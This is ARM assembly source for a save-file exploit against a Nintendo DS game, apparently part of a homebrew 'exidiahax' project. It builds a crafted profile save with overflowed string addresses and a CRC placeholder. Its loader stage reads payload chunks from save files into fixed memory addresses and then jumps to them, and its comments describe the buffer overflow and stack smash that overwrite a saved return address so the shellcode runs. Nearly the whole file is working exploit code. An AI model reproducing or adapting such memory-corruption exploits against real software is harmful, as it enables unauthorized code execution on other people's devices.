.arch armv5te
.fpu softvfp
.eabi_attribute 23, 1
.eabi_attribute 24, 1
.eabi_attribute 25, 1
.eabi_attribute 26, 1
.eabi_attribute 30, 2
.eabi_attribute 18, 4

.global _start
.section .init

#define REGION_USA 1
#define REGION_EUR 2
#define REGION_JP 0

#define	REG_BASE	0x04000000

#if REGCODE!=REGION_JP
#define	dFS_InitCtx 0x2015c94 @ these defines are the same for USA/EUR.
#define	dFS_Open 0x2015ea0
#define	dFS_Close 0x2015f24
#define	dFS_Read 0x2016040
#define	dFS_Seek 0x2016014

#define sprintf_adr 0x2007e64
#define sprintf_formatadr 0x2114704
#define profile_filenamesarray 0x02113d31 @ char[4][16] = {"profile0.sav", ...}
#else

#define	dFS_InitCtx 0x2094c28
#define	dFS_Open 0x2094e34
#define dFS_Close 0x2094eb8
#define dFS_Read 0x2094fd4
#define dFS_Seek 0x2094fa8

#define sprintf_adr 0x20a71a8
#define sprintf_formatadr 0x20c3d04
#define profile_filenamesarray 0x20c33b1

#define MEMSETSTR_ADR 0x2039A08
@ see below comments for this^
#endif

_start:
#if REGCODE!=REGION_JP
.incbin "profilehdr.bin"
#else
.incbin "profilehdr2.bin" @ This is only used for JP exidiahax. Some string addresses are overwritten with a buffer overflow with the data in this .bin. The game clears the data pointed to by these addrs, len is the strlen retval with those addrs. The addrs used were accidentally choosen, but this vector likely would work better than changing code in the pub.sav string func anyway. This clears data some some func's pool, which somehow causes a stack-smash to occur with a saved LR being overwritten with some data from the save, see exidia_payloadsplit for the code used to write the shellcode adr into the save.
@ This attack will not work without the long pub.sav string hax, not much point using it with USA/EUR exidiahax since that already has pub.sav hax.

.word MEMSETSTR_ADR
.word MEMSETSTR_ADR
.word MEMSETSTR_ADR
.word MEMSETSTR_ADR

.incbin "profiletail2.bin"
#endif

.thumb

read_data:
mov r0, #0
bl get_path
mov r1, #0
ldr r2, =0x021fcfdc
ldr r3, =0x36a4
bl read_payload
mov r0, #1
bl get_path
mov r1, #0
ldr r2, =0x02200680
ldr r3, =0x36a4
bl read_payload
mov r0, #2
bl get_path
mov r1, #0x80
lsl r1, #4
ldr r2, =0x02203D24
ldr r3, =0x36a4
bl read_payload

ldr r1, =0x02200000
bx r1

.pool

get_path:
ldr r1, =profile_filenamesarray
lsl r0, r0, #4
add r0, r1, r0
bx lr

.pool

read_payload:
push {lr}
sub sp, #0x68
mov r4, r0
mov r5, r1
mov r6, r2
mov r7, r3

mov r0, sp
ldr r3, =dFS_InitCtx
blx r3

mov r2, #0
mov r1, #0x18
add r0, sp, #0x50

readpayload_clearpath:
strb r2, [r0]
add r0, r0, #1
sub r1, r1, #1
bgt readpayload_clearpath

add r0, sp, #0x50
ldr r1, =sprintf_formatadr
mov r2, r4
ldr r3, =sprintf_adr
blx r3

mov r0, sp
add r1, sp, #0x50
mov r2, #1
ldr r3, =dFS_Open
blx r3

readpayload_rd:
mov r0, sp
mov r1, r6
mov r2, r7
ldr r3, =dFS_Read
blx r3

cmp r5, #0
beq readpayload_close

mov r0, sp
mov r1, r7
add r1, #4
mov r2, #0
ldr r3, =dFS_Seek
blx r3

add r6, r7
mov r7, r5
mov r5, #0
b readpayload_rd

readpayload_close:
mov r0, sp
ldr r3, =dFS_Close
blx r3

add sp, #0x68
pop {pc}

.pool
.align 2

.space (_start + 0x36a4) - .
.word 0xAABBCCDD @ CRC32

